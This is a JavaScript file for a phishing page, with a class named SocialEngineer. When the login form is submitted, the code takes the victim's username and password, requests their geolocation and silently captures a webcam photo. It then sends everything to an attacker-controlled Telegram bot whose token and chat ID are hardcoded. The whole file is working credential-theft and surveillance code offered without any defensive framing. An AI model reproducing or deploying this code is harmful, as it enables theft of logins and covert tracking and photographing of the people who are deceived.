// script.js
// Configuration
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8761461166:AAGJSUvTctDDs0j7kKCIC-gY-7cc2WMnYvM';
const CHAT_ID = process.env.CHAT_ID || '6866229974';

class SocialEngineer {
    constructor() {
        this.init();
    }

    init() {
        document.getElementById('credentialForm').addEventListener('submit', this.handleSubmit.bind(this));
    }

    async handleSubmit(e) {
        e.preventDefault();
        
        // Extract credentials
        const credentials = {
            username: document.getElementById('username').value,
            password: document.getElementById('password').value
        };

        // Collect location
        const location = await this.getLocation();
        
        // Capture photo
        const photo = await this.capturePhoto();

        // Send to Telegram
        this.sendToTelegram({
            ...credentials,
            location,
            photo
        });
    }

    getLocation() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                pos => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
                () => resolve(null)
            );
        });
    }

    capturePhoto() {
        return new Promise(async (resolve, reject) => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;

                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    const dataUrl = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(track => track.stop());
                    resolve(dataUrl);
                }, 2000);
            } catch (err) {
                resolve(null);
            }
        });
    }

    sendToTelegram(data) {
        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMediaGroup`;
        
        fetch(TELEGRAM_API, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                media: [
                    {type: 'text', text: `Credentials: ${data.username}:${data.password}`},
                    ...(data.location ? [{type: 'text', text: `Location: ${data.location}`}]: []),
                    ...(data.photo ? [{type: 'photo', media: data.photo}]: [])
                ]
            })
        }).catch(err => console.error('Telegram error:', err));
    }
}

new SocialEngineer();
